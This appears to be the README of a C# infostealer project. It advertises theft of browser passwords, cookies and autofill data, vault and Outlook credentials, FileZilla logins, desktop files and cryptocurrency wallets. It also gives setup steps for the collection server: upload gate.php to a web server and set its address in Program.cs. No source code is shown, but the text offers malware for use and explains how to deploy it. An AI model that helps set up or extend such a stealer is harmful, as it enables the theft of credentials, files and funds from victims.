# stealer

C#  stealer
Chrome, Opera ,Chromium ,Edge ,Firefox, IE passwords, cookies , bookmarks , autofill  
, vault , Outlook passwords , Filezilla , desktop files  ,wallets

Upload  gate.php  to  web server .
Change the web server address http://localhost/gate.php in file Program.cs



